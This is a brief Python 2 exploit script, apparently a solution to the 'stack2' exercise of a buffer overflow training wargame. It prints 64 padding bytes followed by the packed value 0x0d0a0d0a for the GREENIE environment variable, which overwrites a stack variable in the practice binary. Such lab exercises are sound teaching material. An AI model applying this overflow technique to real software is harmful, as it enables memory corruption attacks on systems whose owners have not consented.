#!/usr/bin/python

import struct

#NOTE
#Usage:
#export GREENIE=`./exploit.py`
#Then run stack2

PAD = "A" * 64

VALUE = struct.pack("I" , 0xd0a0d0a)
#Conver this \r\n\r\n To hex.

exploit = PAD + VALUE 
print exploit
